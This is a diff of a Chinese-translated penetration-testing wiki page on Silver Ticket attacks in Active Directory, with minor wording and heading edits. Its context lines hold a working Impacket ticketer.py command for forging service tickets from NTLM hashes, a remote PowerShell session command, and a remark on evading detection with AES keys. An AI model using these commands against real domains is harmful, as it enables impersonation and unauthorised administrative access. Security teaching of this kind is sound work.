@@ -6,11 +6,11 @@
 
 ## Silver ticket
 
-**银票**攻击涉及在Active Directory (AD)环境中利用服务票证。此方法依赖于**获取服务账户的NTLM哈希**，例如计算机账户，以伪造票证授予服务(TGS)票证。通过这个伪造的票证，攻击者可以访问网络上的特定服务，**冒充任何用户**，通常目标是获取管理权限。强调使用AES密钥伪造票证更安全且不易被检测。
+**银票**攻击涉及在Active Directory (AD)环境中利用服务票证。此方法依赖于**获取服务帐户的NTLM哈希**，例如计算机帐户，以伪造票证授予服务(TGS)票证。通过这个伪造的票证，攻击者可以访问网络上的特定服务，**冒充任何用户**，通常目标是获取管理权限。强调使用AES密钥伪造票证更安全且不易被检测。
 
 对于票证制作，根据操作系统使用不同的工具：
 
-### 在Linux上
+### On Linux
 ```bash
 python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
 export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
@@ -109,14 +109,14 @@ wmic remote.computer.local list full /format:list
 ```bash
 New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
 ```
-检查以下页面以了解 **使用 winrm 连接远程主机的更多方法**：
+查看以下页面以了解 **使用 winrm 连接远程主机的更多方法**：
 
 {{#ref}}
 ../lateral-movement/winrm.md
 {{#endref}}
 
 > [!WARNING]
-> 请注意，**winrm 必须在远程计算机上处于活动和监听状态**才能访问。
+> 请注意，**winrm 必须在远程计算机上处于活动状态并监听**才能访问它。
 
 ### LDAP
 
